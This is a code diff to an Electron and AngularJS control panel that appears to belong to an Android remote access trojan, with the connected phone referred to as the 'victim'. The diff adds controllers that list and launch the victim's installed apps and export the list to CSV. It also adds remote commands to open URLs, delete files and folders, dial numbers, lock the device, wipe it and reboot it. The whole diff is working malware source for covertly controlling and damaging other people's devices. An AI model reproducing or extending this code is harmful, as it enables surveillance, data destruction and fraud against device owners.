@@ -2,7 +2,8 @@ const { remote } = require('electron');
 const { ipcRenderer } = require('electron');
 var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
 var fs = require("fs-extra");
-const CONSTANTS = require(__dirname + '/assets/js/Constants')
+const CONSTANTS = require(__dirname + '/assets/js/Constants');
+const CUSTOM_FUNCTIONS = require(__dirname + '/assets/js/CustomFunctions');
 var ORDER = CONSTANTS.order;
 var socket = remote.getCurrentWebContents().victim;
 var homeDir = require('homedir');
@@ -42,9 +43,17 @@ app.config(function($routeProvider) {
             templateUrl: "./views/mic.html",
             controller: "MicCtrl"
         })
+        .when("/installedApps", {
+            templateUrl: "./views/installedApps.html",
+            controller: "AppsCtrl"
+        })
         .when("/location", {
             templateUrl: "./views/location.html",
             controller: "LocCtrl"
+        })
+        .when("/utilities", {
+            templateUrl: "./views/utilities.html",
+            controller: "UtilitiesCtrl"
         });
 });
 
@@ -87,11 +96,6 @@ app.controller("LabCtrl", function($scope, $rootScope, $location) {
     $labCtrl.goToPage = (page) => {
         $location.path('/' + page);
     }
-
-
-
-
-
 });
 
 
@@ -337,6 +341,236 @@ app.controller("SMSCtrl", function($scope, $rootScope) {
 
 
 
+
+
+
+
+
+//-----------------------Apps Controller (installedApps.htm)------------------------
+// Apps controller
+app.controller("AppsCtrl", function($scope, $rootScope) {
+    $AppsCtrl = $scope;
+    $AppsCtrl.appsList = [];
+    var apps = CONSTANTS.orders.apps;
+    var runApp = CONSTANTS.orders.runApp;
+
+    $AppsCtrl.$on('$destroy', () => {
+        // release resources, cancel Listner...
+        socket.removeAllListeners(apps);
+        socket.removeAllListeners(runApp);
+    });
+
+    $AppsCtrl.load = 'loading';
+    $rootScope.Log('Get Apps list..');
+    socket.emit(ORDER, { order: apps });
+
+
+    $AppsCtrl.barLimit = 50;
+    $AppsCtrl.increaseLimit = () => {
+        $AppsCtrl.barLimit += 50;
+    }
+
+
+    $AppsCtrl.SaveAppInfo = () => {
+        if ($AppsCtrl.appsList.length == 0)
+            return;
+
+        var csvRows = [];
+        for (var i = 0; i < $AppsCtrl.appsList.length; i++) {
+            var package_name = $AppsCtrl.appsList[i].packageName;
+            var app_name = (($AppsCtrl.appsList[i].appName) == "" ? "No App Name" : $AppsCtrl.appsList[i].appName);
+            var version_name = $AppsCtrl.appsList[i].versionName;
+            csvRows.push("App: " + app_name + ",\t" + "Package: " + package_name + ",\t" + "Version: " + version_name);
+        }
+
+        var csvStr = csvRows.join("\n");
+        var csvPath = path.join(downloadsPath, "AppsInfo_" + Date.now() + ".csv");
+        $rootScope.Log("Saving Apps Info List...");
+        fs.outputFile(csvPath, csvStr, (error) => {
+            if (error)
+                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
+            else
+                $rootScope.Log("Apps Info List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
+
+        });
+
+    }
+
+    $AppsCtrl.RunApp = (app_name, app_package_name) => {
+        $rootScope.Log('Launching ' + app_name);
+        socket.emit(ORDER, { order: runApp, extra: app_package_name });
+    }
+
+    socket.on(apps, (data) => {
+        if (data.appsList) {
+            $AppsCtrl.load = '';
+            $rootScope.Log('Apps list arrived', CONSTANTS.logStatus.SUCCESS);
+            $AppsCtrl.appsList = data.appsList;
+            $AppsCtrl.totalAppsSize = data.appsList.length;
+            $AppsCtrl.$apply();
+        }
+    });
+
+    socket.on(runApp, (data) =>{
+        
+        if(data.launchingStatus == true){
+            $rootScope.Log('App launched successfully..', CONSTANTS.logStatus.SUCCESS);
+        }
+        else{
+            $rootScope.Log("Failed to launch app..", CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+
+
+});
+
+
+
+
+
+
+
+
+
+//-----------------------Utilities Controller (utilities.html)------------------------
+// Utilities Controller
+
+app.controller("UtilitiesCtrl", function($scope, $rootScope){
+
+    $UtilitiesCtrl = $scope;
+    $UtilitiesCtrl.utils = [];
+
+    var openUrl = CONSTANTS.orders.openUrl;
+    var deleteFileFolder = CONSTANTS.orders.deleteFileFolder;
+    var dialNumber = CONSTANTS.orders.dialNumber;
+    var lockDevice = CONSTANTS.orders.lockDevice;
+    var wipeDevice = CONSTANTS.orders.wipeDevice;
+    var rebootDevice = CONSTANTS.orders.rebootDevice;
+
+    $UtilitiesCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(openUrl);
+    });
+
+    
+    $UtilitiesCtrl.OpenURL = (url) => {
+
+        if(CUSTOM_FUNCTIONS.isValidURL(url)){
+
+            $rootScope.Log('Opening url..');
+            socket.emit(ORDER, { order: openUrl, url: url });
+        }
+        else{
+            $rootScope.Log('Invalid URL..', CONSTANTS.logStatus.FAIL);
+        }
+    }
+
+    socket.on(openUrl, (data) =>{
+        if(data.status == true){
+            $rootScope.Log('URL opened successfully..', CONSTANTS.logStatus.SUCCESS);
+        }
+        else{
+            $rootScope.Log("Failed to open url..", CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+    // ............................................
+
+    $UtilitiesCtrl.DeleteFileFolder = (fileFolderPath) => {
+
+        $rootScope.Log('Deleting path "' + fileFolderPath + '"');
+        socket.emit(ORDER, { order: deleteFileFolder, fileFolderPath: fileFolderPath }); 
+    }
+
+    socket.on(deleteFileFolder, (data) =>{
+        if(data.status == true){
+            $rootScope.Log('Deleted successfully..', CONSTANTS.logStatus.SUCCESS);
+        }
+        else{
+            $rootScope.Log("Failed to delete..", CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+    // ............................................
+
+    $UtilitiesCtrl.DialNumber = (number) => {
+
+        $rootScope.Log('Dialing to ' + number);
+        socket.emit(ORDER, { order: dialNumber, number: number });
+    }
+
+    socket.on(dialNumber, (data) =>{
+        if(data.status == true){
+            $rootScope.Log('Successfully dialed number..', CONSTANTS.logStatus.SUCCESS);
+        }
+        else{
+            $rootScope.Log("Failed to dial number..", CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+    // ............................................
+
+    $UtilitiesCtrl.LockDevice = () => {
+
+        $rootScope.Log('Locking device..');
+        socket.emit(ORDER, { order: lockDevice});
+    }
+
+    socket.on(lockDevice, (data) =>{
+        if(data.status == true){
+            $rootScope.Log(data.message, CONSTANTS.logStatus.SUCCESS);
+        }
+        else{
+            $rootScope.Log(data.message, CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+    // ............................................
+
+    $UtilitiesCtrl.WipeDevice = () => {
+
+        if(confirm("Are you sure, you want to wipe out the victim?")){
+
+            $rootScope.Log('Wiping victim\'s device..');
+            socket.emit(ORDER, { order: wipeDevice});
+        }
+        else{
+            $rootScope.Log("You have choosen cancel.");
+        }
+    }
+
+    socket.on(wipeDevice, (data) =>{
+        if(data.status == true){
+            $rootScope.Log(data.message, CONSTANTS.logStatus.SUCCESS);
+        }
+        else{
+            $rootScope.Log(data.message, CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+    // ............................................
+
+    $UtilitiesCtrl.RebootDevice = () => {
+
+        if(confirm("Confirm by pressing okay.")){
+
+            $rootScope.Log('Rebooting victim\'s device..');
+            socket.emit(ORDER, { order: rebootDevice});
+        }
+        else{
+            $rootScope.Log("You have choosen cancel.");
+        }
+    }
+
+    socket.on(rebootDevice, (data) =>{
+        if(data.status == true){
+            $rootScope.Log(data.message, CONSTANTS.logStatus.SUCCESS);
+        }
+        else{
+            $rootScope.Log(data.message, CONSTANTS.logStatus.FAIL);
+        }
+    });
+});
 
 
 
